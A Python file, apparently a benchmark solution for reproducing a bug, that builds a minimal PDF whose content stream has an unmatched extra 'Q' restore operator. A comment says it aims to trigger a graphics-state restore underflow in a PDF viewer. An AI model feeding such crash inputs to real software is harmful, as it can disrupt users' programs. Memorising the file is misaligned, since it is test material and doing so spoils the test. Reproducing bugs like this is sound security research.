import os
import tarfile
from typing import List, Tuple


class Solution:
    def _build_min_pdf(self, content_stream: bytes) -> bytes:
        parts: List[bytes] = []
        parts.append(b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n")

        offsets: List[int] = [0]  # object 0 placeholder

        def add_obj(objnum: int, body: bytes) -> None:
            offsets.append(sum(len(p) for p in parts))
            parts.append(str(objnum).encode("ascii") + b" 0 obj\n" + body + b"\nendobj\n")

        # Objects
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        add_obj(
            3,
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << >> /Contents 4 0 R >>",
        )

        stream_dict = b"<< /Length " + str(len(content_stream)).encode("ascii") + b" >>"
        stream_obj = stream_dict + b"\nstream\n" + content_stream + b"endstream"
        add_obj(4, stream_obj)

        xref_offset = sum(len(p) for p in parts)
        parts.append(b"xref\n")
        parts.append(b"0 5\n")
        parts.append(b"0000000000 65535 f \n")
        for off in offsets[1:]:
            parts.append(f"{off:010d} 00000 n \n".encode("ascii"))

        parts.append(b"trailer\n")
        parts.append(b"<< /Size 5 /Root 1 0 R >>\n")
        parts.append(b"startxref\n")
        parts.append(str(xref_offset).encode("ascii") + b"\n")
        parts.append(b"%%EOF\n")
        return b"".join(parts)

    def solve(self, src_path: str) -> bytes:
        # Try to ensure the trigger aligns with the described viewer-state restore underflow:
        # create a PDF content stream with an extra graphics-state restore (Q) beyond the saves (q).
        content = b"q\n0 0 m 10 10 l S\nQ\nQ\n"
        return self._build_min_pdf(content)